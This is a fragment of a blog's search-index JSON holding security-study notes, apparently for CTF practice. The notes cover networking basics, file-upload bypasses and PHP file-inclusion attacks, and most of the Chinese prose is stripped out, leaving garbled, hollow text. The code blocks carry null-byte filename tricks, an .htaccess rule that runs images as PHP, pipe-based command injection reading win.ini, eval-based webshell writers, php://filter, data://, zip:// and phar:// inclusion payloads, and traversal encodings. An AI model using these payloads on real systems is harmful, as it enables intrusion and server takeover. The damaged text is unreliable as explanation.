src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615212131635.png\" alt=\"image-20200615212131635\"></p>\n<p>FCS</p>\n<h3 id=\"0x05\"><a href=\"#0x05\" class=\"headerlink\" title=\"0x05\"></a>0x05</h3><p></p>\n<p><strong></strong><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615214530777.png\" alt=\"image-20200615214530777\"></p>\n<p></p>\n<h3 id=\"0x06\"><a href=\"#0x06\" class=\"headerlink\" title=\"0x06\"></a>0x06</h3><h2 id=\"-\"><a href=\"#-\" class=\"headerlink\" title=\" \"></a> </h2><h3 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h3><p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200616110826298.png\" alt=\"image-20200616110826298\"></p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200616111607056.png\" alt=\"image-20200616111607056\"></p>\n<p></p>\n<p><strong></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip:10.0.0.1</span><br><span class=\"line\">:255.0.0.0</span><br><span class=\"line\">&#x2F;&#x2F;255ip10</span><br><span class=\"line\"></span><br><span class=\"line\">ip:12.0.0.1</span><br><span class=\"line\">255.255.0.0</span><br><span class=\"line\">&#x2F;&#x2F;255.255.0.012.0</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200616114228562.png\" alt=\"image-20200616114228562\"></p>\n<h3 id=\"0x02OSI\"><a href=\"#0x02OSI\" class=\"headerlink\" title=\"0x02OSI\"></a>0x02OSI</h3><p></p>\n<ol>\n<li><p> </p>\n</li>\n<li><p> </p>\n</li>\n<li><p> IP</p>\n</li>\n<li><p>   </p>\n<p>  ARPipMAC</p>\n<p></p>\n</li>\n</ol>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200617112108377.png\" alt=\"image-20200617112108377\"></p>\n<h3 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h3><h4 id=\"ARP\"><a href=\"#ARP\" class=\"headerlink\" title=\"ARP\"></a><strong>ARP</strong></h4><p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200617113421057.png\" alt=\"image-20200617113421057\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">arp -a  &#x2F;&#x2F;mac</span><br><span class=\"line\">arp -s ip mac   &#x2F;&#x2F;IPMAC</span><br></pre></td></tr></table></figure>\n<p>arp:ip MACFF-FF-FF-FF-FF-FF<strong>ipMAC</strong></p>\n<p>arp: MAC</p>\n<h4 id=\"ICMP\"><a href=\"#ICMP\" class=\"headerlink\" title=\"ICMP\"></a><strong></strong>ICMP</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ping      ttl&#x3D;64 linux</span><br><span class=\"line\">\t\t\t\t\t\t\t128 windows</span><br><span class=\"line\">\t\t\t\t\t\t\t255 unix</span><br><span class=\"line\">ping www.baidu.com -t    ping</span><br><span class=\"line\">ping www.baidu.com -l 200   </span><br><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">ping 8.8.8.8 -i 1 ttl</span><br><span class=\"line\">pathping   ping</span><br><span class=\"line\">tracert    </span><br></pre></td></tr></table></figure>\n<h4 id=\"IGMP\"><a href=\"#IGMP\" class=\"headerlink\" title=\"IGMP\"></a>IGMP</h4><p></p>\n<p>ipffmac255</p>\n<p></p>\n<p></p>\n<h3 id=\"0x04\"><a href=\"#0x04\" class=\"headerlink\" title=\"0x04\"></a>0x04</h3><p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200619111139014.png\" alt=\"image-20200619111139014\"></p>\n<p>TCP/IP v4 v6</p>\n<p></p>\n<p>100 100 100</p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200619112943227.png\" alt=\"image-20200619112943227\"></p>\n<p>TTL</p>\n<p></p>\n<p>ICMP 1      IGMP  2       TCP  6        UDP  17  IPv6   41       OSPF   89</p>\n<p>1500</p>\n<p>IP655351500</p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200619111512690.png\" alt=\"image-20200619111512690\"></p>\n<h1 id=\"FTP\"><a href=\"#FTP\" class=\"headerlink\" title=\"FTP\"></a>FTP</h1><p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807090006669.png\" alt=\"image-20200807090006669\"></p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807090512480.png\" alt=\"image-20200807090512480\"></p>\n<p><strong>Active Mode</strong></p>\n<p></p>\n<p>21</p>\n<p>20</p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807100649933.png\" alt=\"image-20200807100649933\"></p>\n<p><strong>Passive</strong></p>\n<p>21</p>\n<p></p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807100800469.png\" alt=\"image-20200807100800469\"></p>\n<h1 id=\"Telnet\"><a href=\"#Telnet\" class=\"headerlink\" title=\"Telnet\"></a>Telnet</h1><p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807145634367.png\" alt=\"image-20200807145634367\"></p>\n<p><strong>telnet</strong>23</p>\n<h1 id=\"SSH\"><a href=\"#SSH\" class=\"headerlink\" title=\"SSH\"></a>SSH</h1><p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200811154248708.png\" alt=\"image-20200811154248708\"></p>\n","categories":[""],"tags":["Course"]},{"title":"","url":"https://pz1o.top/2020/12/09//","content":"<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><p><a href=\"https://www.andseclab.com/2018/12/01/%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e%e6%94%bb%e5%87%bb%e6%80%bb%e7%bb%93/\" target=\"_blank\" rel=\"noopener\">https://www.andseclab.com/2018/12/01/%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e%e6%94%bb%e5%87%bb%e6%80%bb%e7%bb%93/</a></p>\n<h2 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h2><ol>\n<li></li>\n<li> </li>\n<li></li>\n<li></li>\n</ol>\n<h2 id=\"0x02js\"><a href=\"#0x02js\" class=\"headerlink\" title=\"0x02js\"></a>0x02js</h2><h2 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h2><p> %00</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.jpg%00.php</span><br><span class=\"line\">1.php%00.jpg</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x04\"><a href=\"#0x04\" class=\"headerlink\" title=\"0x04\"></a>0x04</h2><p></p>\n<p></p>\n<p>php3 php4 php5 phtmlpht  </p>\n<h2 id=\"0x05\"><a href=\"#0x05\" class=\"headerlink\" title=\"0x05\"></a>0x05</h2><h2 id=\"0x06MIME\"><a href=\"#0x06MIME\" class=\"headerlink\" title=\"0x06MIME\"></a>0x06MIME</h2><p>content-type</p>\n<h2 id=\"0x07\"><a href=\"#0x07\" class=\"headerlink\" title=\"0x07\"></a>0x07</h2><h3 id=\"iis\"><a href=\"#iis\" class=\"headerlink\" title=\"iis\"></a>iis</h3><p><img src=\"/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609194945742.png\" alt=\"image-20200609194945742\"></p>\n<h3 id=\"apache\"><a href=\"#apache\" class=\"headerlink\" title=\"apache\"></a>apache</h3><p><img src=\"/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609195122633.png\" alt=\"image-20200609195122633\"></p>\n<h3 id=\"nginx\"><a href=\"#nginx\" class=\"headerlink\" title=\"nginx\"></a>nginx</h3><p><img src=\"/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609195540127.png\" alt=\"image-20200609195540127\"></p>\n<h3 id=\"net\"><a href=\"#net\" class=\"headerlink\" title=\".net\"></a>.net</h3><p><img src=\"/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609200056116.png\" alt=\"image-20200609200056116\"></p>\n<h3 id=\"phtml\"><a href=\"#phtml\" class=\"headerlink\" title=\"phtml\"></a>phtml</h3><p>apachehttpd.conf</p>\n<p>AddType application/x-httpd-php.phtml</p>\n<p>phtmlphp</p>\n<h3 id=\"htaccess\"><a href=\"#htaccess\" class=\"headerlink\" title=\".htaccess\"></a>.htaccess</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;Files *.jpg&gt;</span><br><span class=\"line\">ForceType:application&#x2F;x-httpd-php</span><br><span class=\"line\">SetHandler:application&#x2F;x-httpd-php</span><br><span class=\"line\">&lt;&#x2F;Files&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;1.jpg</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">phpinfo();</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&#x2F;&#x2F;jpgphp</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x08\"><a href=\"#0x08\" class=\"headerlink\" title=\"0x08\"></a>0x08</h2>","categories":["web"],"tags":["web"]},{"title":"","url":"https://pz1o.top/2020/12/09//","content":"<p>web</p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h2 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h2><p></p>\n<h2 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h2><ul>\n<li>allow_url_fopen=On(On) </li>\n<li>allow_url_include=On(php5.2Off) include/require</li>\n</ul>\n<h2 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h2><ul>\n<li>include(): include include() <strong></strong></li>\n<li>require():,<strong>,</strong></li>\n</ul>\n<h2 id=\"0x04\"><a href=\"#0x04\" class=\"headerlink\" title=\"0x04\"></a>0x04</h2><p><a href=\"https://www.ghtwf01.cn/index.php/archives/273/#menu_index_21\" target=\"_blank\" rel=\"noopener\">https://www.ghtwf01.cn/index.php/archives/273/#menu_index_21</a></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>PHPsystemexecshell_exec</p>\n<p>passthrupopenproc_popen</p>\n<p></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ul>\n<li><p></p>\n</li>\n<li><p></p>\n</li>\n<li><p></p>\n</li>\n</ul>\n<hr>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ul>\n<li>WindowsLinux<strong>&amp;</strong></li>\n<li><strong>|</strong>8.8.8.8|whoami </li>\n<li><strong>||</strong></li>\n<li><strong>&amp;&amp;</strong></li>\n<li>Linux</li>\n</ul>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ul>\n<li><p>systemFALSE</p>\n</li>\n<li><p>exec</p>\n</li>\n<li><p>shell_execNULL</p>\n</li>\n<li><p>passthru </p>\n</li>\n</ul>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p><strong></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...|dir C:\\user</span><br></pre></td></tr></table></figure>\n<p><strong></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">8.8.8.8|type C:\\windows\\win.ini</span><br></pre></td></tr></table></figure>\n<hr>\n<h2 id=\"0x05php\"><a href=\"#0x05php\" class=\"headerlink\" title=\"0x05php\"></a>0x05php</h2><p>PHP /IO PHP  </p>\n<h3 id=\"php-input\"><a href=\"#php-input\" class=\"headerlink\" title=\"php://input\"></a>php://input</h3><p>php://input:<strong>postphp</strong>php://input,postphppost</p>\n<p>ctfphp://inputphp</p>\n<p></p>\n<ol>\n<li></li>\n<li></li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php fputs(fopen(shell.php,w),&lt;?php eval($_POST[&quot;cmd&quot;];?&gt;);?&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"php-filter\"><a href=\"#php-filter\" class=\"headerlink\" title=\"php://filter\"></a>php://filter</h3><p><strong>php://filter</strong>php://filterphp </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;xxx.php</span><br><span class=\"line\">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</span><br></pre></td></tr></table></figure>\n<h3 id=\"zip\"><a href=\"#zip\" class=\"headerlink\" title=\"zip://\"></a>zip://</h3><p><strong>zip://</strong> zip://php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">zip:&#x2F;&#x2F;archive.zip#dir&#x2F;file.txt</span><br><span class=\"line\">zip:&#x2F;&#x2F;[]#[]</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;127.0.0.1&#x2F;cmd.php?file&#x3D;zip:&#x2F;&#x2F;D:&#x2F;soft&#x2F;phpStudy&#x2F;WWW&#x2F;file.jpg%23phpcode.txt</span><br><span class=\"line\"></span><br><span class=\"line\">PHPphpcode.txtphpcode.txtzip,file.zip,zipfile.zipfile.jpg</span><br><span class=\"line\"></span><br><span class=\"line\">#getgeturl%23</span><br></pre></td></tr></table></figure>\n<h3 id=\"data-phar\"><a href=\"#data-phar\" class=\"headerlink\" title=\"data://phar://\"></a>data://phar://</h3><p><strong>data://</strong> php://inputdata://php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data:&#x2F;&#x2F;[MIME-type][;charset&#x3D;&lt;encoding&gt;][;base64],&lt;data&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">?file&#x3D;data:&#x2F;&#x2F;&lt;?php phpinfo()?&gt;</span><br><span class=\"line\">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class=\"line\">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure>\n<p><strong>phar://</strong> zip:// </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file&#x3D;phar:&#x2F;&#x2F;zip.jpg&#x2F;cmd.php</span><br><span class=\"line\">?file&#x3D;phar:&#x2F;&#x2F;D:\\zip.jpg\\cmd.php</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200803154243815.png\" alt=\"image-20200803154243815\"></p>\n<h2 id=\"0x06Apache\"><a href=\"#0x06Apache\" class=\"headerlink\" title=\"0x06Apache\"></a>0x06Apache</h2><p>WEBPHPPHP</p>\n<p></p>\n<ul>\n<li></li>\n<li></li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ApacheWindosaccess.logerror.log()Linuxaccess_logerror_log</span><br><span class=\"line\">http:&#x2F;&#x2F;www.xxxx.com&#x2F;&lt;?php phpinfo(); ?&gt;,burpsuit&lt;?php phpinfo(); ?&gt; apacheapacheapache</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x07SESSION\"><a href=\"#0x07SESSION\" class=\"headerlink\" title=\"0x07SESSION\"></a>0x07SESSION</h2><p>SESSIONpayload</p>\n<p></p>\n<ol>\n<li>SESSION</li>\n<li>SESSION</li>\n</ol>\n<p>phpsessionphpinfosession.save_path</p>\n<h2 id=\"0x08\"><a href=\"#0x08\" class=\"headerlink\" title=\"0x08\"></a>0x08</h2><p>phplinux/tmpwindowsc:\\winsdows\\temp</p>\n<p>linuxwindow65535</p>\n<h2 id=\"0x09\"><a href=\"#0x09\" class=\"headerlink\" title=\"0x09\"></a>0x09</h2><p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cmd</span><br><span class=\"line\"></span><br><span class=\"line\">1.jpg2.php</span><br><span class=\"line\"></span><br><span class=\"line\">copy  1.jpg&#x2F;b+2.php  3.jpg</span><br><span class=\"line\"></span><br><span class=\"line\">1.jpgphp2.php3.jpg</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;upload&#x2F;201811.jpg</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&#39;pass&#39;]);?&gt;&quot;)?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">URLhttp:&#x2F;&#x2F;www.xxxx.com&#x2F;index.php?page&#x3D;.&#x2F;upload&#x2F;201811.jpgindex.phpshell.php</span><br></pre></td></tr></table></figure>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h2 id=\"0x10\"><a href=\"#0x10\" class=\"headerlink\" title=\"0x10\"></a>0x10</h2><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>../../</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file&#x3D;..&#x2F;..&#x2F;Flag&#x2F;flag.txt</span><br></pre></td></tr></table></figure>\n<p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\terror_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t$file = $_GET[<span class=\"string\">\"file\"</span>];</span><br><span class=\"line\">\t<span class=\"comment\">//</span></span><br><span class=\"line\">\t<span class=\"keyword\">include</span> <span class=\"string\">\"/var/www/html/\"</span>.$file;</span><br><span class=\"line\"></span><br><span class=\"line\">\thighlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ol>\n<li><p>url</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">..&#x2F;</span><br><span class=\"line\">%2e%2e%2f</span><br><span class=\"line\">..%2f</span><br><span class=\"line\">%2e%2e&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\">..\\</span><br><span class=\"line\">%2e%2e%5c</span><br><span class=\"line\">..%5c</span><br><span class=\"line\">%2e%2e\\</span><br></pre></td></tr></table></figure>\n</li>\n<li><p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">..&#x2F;</span><br><span class=\"line\">%252e%252e%252f</span><br><span class=\"line\"></span><br><span class=\"line\">..\\</span><br><span class=\"line\">%252e%252e%255c</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>/</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">..&#x2F;</span><br><span class=\"line\">..%c0%af</span><br><span class=\"line\">%c0%ae%c0%ae&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\">..\\</span><br><span class=\"line\">..%c1%9c</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"0x11\"><a href=\"#0x11\" class=\"headerlink\" title=\"0x11\"></a>0x11</h2><p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\terror_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t$file = $_GET[<span class=\"string\">\"file\"</span>];</span><br><span class=\"line\">\t<span class=\"comment\">//</span></span><br><span class=\"line\">\t<span class=\"keyword\">include</span> $file.<span class=\"string\">\".txt\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\thighlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"url\"><a href=\"#url\" class=\"headerlink\" title=\"url\"></a>url</h3><p>url</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">protocol :&#x2F;&#x2F; hostname[:port] &#x2F; path &#x2F; [;parameters][?query]#fragment</span><br></pre></td></tr></table></figure>\n<p><strong>query(?)</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">?file&#x3D;http:&#x2F;&#x2F;localhost:8080&#x2F;phpinfo.php?</span><br><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">?file&#x3D;http:&#x2F;&#x2F;localhost:8081&#x2F;phpinfo.php?.txt</span><br></pre></td></tr></table></figure>\n<p><strong>fragment(#)</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">?file&#x3D;http:&#x2F;&#x2F;localhost:8081&#x2F;phpinfo.php%23</span><br><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">?file&#x3D;http:&#x2F;&#x2F;localhost:8081&#x2F;phpinfo.php#.txt</span><br></pre></td></tr></table></figure>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p><strong>zip://</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">?file&#x3D;zip:&#x2F;&#x2F;[]%23phpinfo</span><br><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">?file&#x3D;zip:&#x2F;&#x2F;[]%23phpinfo.txt</span><br></pre></td></tr></table></figure>\n<p><strong>phar://</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">?file&#x3D;phar:&#x2F;&#x2F;php.zip&#x2F;phpinfo</span><br><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">?file&#x3D;phar:&#x2F;&#x2F;php.zip&#x2F;phpinfo.txt</span><br></pre></td></tr></table></figure>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p><strong></strong></p>\n<ul>\n<li>php &lt; php 5.2.8</li>\n</ul>\n<p><strong></strong></p>\n<ul>\n<li>Windows256</li>\n<li>Linux4096</li>\n</ul>\n<p><strong></strong></p>\n<ul>\n<li><p> ./(Windows . )</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  ?file&#x3D;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;shell.php</span><br><span class=\"line\">1</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>.txt</p>\n<h3 id=\"00\"><a href=\"#00\" class=\"headerlink\" title=\"%00\"></a>%00</h3><p><strong></strong></p>\n<ul>\n<li>magic_quotes_gpc = Off</li>\n<li>php &lt; php 5.3.4</li>\n</ul>\n<p><strong></strong></p>\n<ul>\n<li><p>%00</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  ?file&#x3D;shell.php%00</span><br><span class=\"line\">1</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>%00</p>\n<h2 id=\"0x12phpinfoGetshell\"><a href=\"#0x12phpinfoGetshell\" class=\"headerlink\" title=\"0x12phpinfoGetshell\"></a>0x12phpinfoGetshell</h2><p><a href=\"https://cloud.tencent.com/developer/article/1609810\" target=\"_blank\" rel=\"noopener\">https://cloud.tencent.com/developer/article/1609810</a></p>\n<p>phpinfophpinfo</p>\n<p>1.system</p>\n<p><img src=\"/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215927019.png\" alt=\"image-20200928215927019\"></p>\n<p></p>\n<p>2.ip</p>\n<p><img src=\"/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215935664.png\" alt=\"image-20200928215935664\"></p>\n<p>ipcdn</p>\n<p> 3.web</p>\n<p><img src=\"/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215944121.png\" alt=\"image-20200928215944121\"></p>\n<p>SQLwebshellxampp</p>\n<ol>\n<li>disable_functions</li>\n</ol>\n<p><img src=\"/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215953280.png\" 